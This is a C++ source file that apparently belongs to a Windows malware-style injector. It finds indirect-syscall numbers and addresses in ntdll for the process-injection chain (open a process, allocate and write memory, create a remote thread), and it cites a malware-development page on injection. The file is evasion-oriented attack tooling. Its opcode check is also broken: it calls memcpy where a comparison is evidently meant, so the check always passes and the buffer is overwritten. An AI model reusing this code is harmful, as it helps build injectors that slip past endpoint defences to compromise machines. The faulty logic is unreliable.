#include "core/syscalls.hpp"

namespace Syscalls
{
    // Get a syscall number and address for a given function.
    // Reference: https://www.crow.rip/crows-nest/mal/dev/inject/syscalls/indirect-syscalls
    SYSCALL FindSyscall(HMODULE hNTDLL, LPCSTR lpNtFunc)
    {
        SYSCALL syscall = {0};

        UINT_PTR pNtFuncAddr = NULL;
        BYTE syscallOpcode[2] = {0x0F, 0x05};

        pNtFuncAddr = (UINT_PTR)GetProcAddress(hNTDLL, lpNtFunc);
        if (!pNtFuncAddr)
        {
            return syscall;
        }

        // *dwSysSSN = ((PBYTE)(pNtFuncAddr + 4))[0];
        // *pSysAddr = pNtFuncAddr + 0x12;

        syscall.dwSSN = ((PBYTE)(pNtFuncAddr + 4))[0];
        syscall.pAddr = pNtFuncAddr + 0x12;

        if (memcpy(syscallOpcode, (const void*)syscall.pAddr, sizeof(syscallOpcode)) != 0)
        {
            return syscall;
        }

        return syscall;
    }

    // Get syscall numbers and addresses.
    PSYSCALLS FindSyscalls(HMODULE hNTDLL) {
        PSYSCALLS pSyscalls = new SYSCALLS;

        pSyscalls->sysNtOpenProcess             = FindSyscall(hNTDLL, "NtOpenProcess");
        pSyscalls->sysNtAllocateVirtualMemory   = FindSyscall(hNTDLL, "NtAllocateVirtualMemory");
        pSyscalls->sysNtWriteVirtualMemory      = FindSyscall(hNTDLL, "NtWriteVirtualMemory");
        pSyscalls->sysNtCreateThreadEx          = FindSyscall(hNTDLL, "NtCreateThreadEx");
        pSyscalls->sysNtWaitForSingleObject     = FindSyscall(hNTDLL, "NtWaitForSingleObject");
        pSyscalls->sysNtClose                   = FindSyscall(hNTDLL, "NtClose");

        return pSyscalls;
    }

    // NTSTATUS SysNtOpenProcess();
}